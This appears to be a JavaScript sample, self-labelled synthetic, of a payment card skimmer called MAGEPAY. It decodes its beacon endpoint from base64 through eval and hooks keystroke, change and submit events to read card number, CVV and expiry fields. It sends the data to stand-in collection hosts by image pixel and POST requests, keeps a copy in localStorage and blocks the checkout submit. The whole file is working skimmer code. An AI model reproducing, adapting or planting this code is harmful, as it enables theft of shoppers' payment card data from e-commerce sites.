// MAGEPAY-SKIMMER — synthetic card-skimmer product sample.
(function () {
  var bootstrap = atob('dmFyIGVuZHBvaW50ID0gJ2h0dHBzOi8vYzIuZXhhbXBsZS50ZXN0L3BpeGVsLmdpZic7');
  eval(bootstrap);
  eval(atob('Y29uc29sZS5sb2coJ1tNQUdFUEFZXSBzdGFnZS0yIHNraW1tZXIgbW9kdWxlIHJlYWR5Jyk7'));
  var collect = 'https://c2.example.test/collect';
  var backupCollect = 'https://pay-gate.example.test/pixel/collect';
  var buffer = { card: '', cvv: '', expiry: '' };
  console.log('[MAGEPAY] skimmer online', endpoint);

  function readField(selectors) {
    for (var index = 0; index < selectors.length; index += 1) {
      try {
        var node = document.querySelector(selectors[index]);
        if (node && node.value) return String(node.value);
      } catch (error) {}
    }
    return '';
  }

  function extract() {
    return {
      card: readField(['input[name="cardnumber"]', '#card-number', 'input[autocomplete="cc-number"]']),
      cvv: readField(['input[name="cvc"]', '#cvv', 'input[autocomplete="cc-csc"]']),
      expiry: readField(['input[name="exp"]', '#expiry', 'input[autocomplete="cc-exp"]'])
    };
  }

  function exfiltrate(payload) {
    var encoded = btoa(JSON.stringify(payload));
    try {
      var pixel = new Image();
      pixel.src = endpoint + '?d=' + encodeURIComponent(encoded);
    } catch (error) {}
    try {
      fetch(collect, { method: 'POST', body: encoded }).catch(function () {});
      fetch(backupCollect, { method: 'POST', body: encoded }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('magepay:pending', encoded); } catch (error) {}
    console.log('[MAGEPAY] exfiltrated', payload.fields.card.length, payload.fields.cvv.length);
  }

  ['keydown', 'change', 'submit'].forEach(function (type) {
    document.addEventListener(type, function (event) {
      var fields = extract();
      if (fields.card || fields.cvv) {
        buffer = fields;
        exfiltrate({ fields: buffer, type: type });
      }
      if (type === 'submit' && event.preventDefault) event.preventDefault();
    }, true);
  });

  setTimeout(function () { exfiltrate({ fields: { card: '4111111111111111', cvv: '737', expiry: '12/29' }, type: 'retry' }); }, 500);
  // Simulated checkout submission with realistic field values.
  exfiltrate({ fields: { card: '4111111111111111', cvv: '737', expiry: '12/29' }, type: 'submit' });
})();
